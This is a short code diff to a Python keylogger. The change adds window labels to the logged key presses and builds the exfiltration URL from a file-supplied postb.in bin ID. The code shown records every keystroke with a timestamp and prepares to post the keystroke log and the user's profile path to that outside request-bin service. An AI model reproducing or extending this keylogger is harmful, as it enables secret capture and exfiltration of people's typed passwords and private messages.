@@ -16,14 +16,16 @@ class Keylogger:
     
     def callback(self, event):
         name = event.name
+        window = '<window goes here>'
         if len(name) > 1:
             name = name.replace(" ", "_")
             name = f"[{name.upper()}]"
         time = datetime.now()
-        self.log += ("\n" + time.strftime("%m/%d/%Y, %H:%M:%S") + "\t" + name)
+        self.log += ("\n" + time.strftime("%m/%d/%Y, %H:%M:%S") +"\t" + 'WINDOW: ' + window + "\t key: " + name )
 
     def postData(self):
-        post_url = "https://postb.in/1603850404712-1531936014071"
+        bin_id = open('binID.txt', 'r').read()
+        post_url = "https://postb.in/" + bin_id
         data = {
             'user' : os.environ['USERPROFILE'],
             'keystroke'  : self.log,
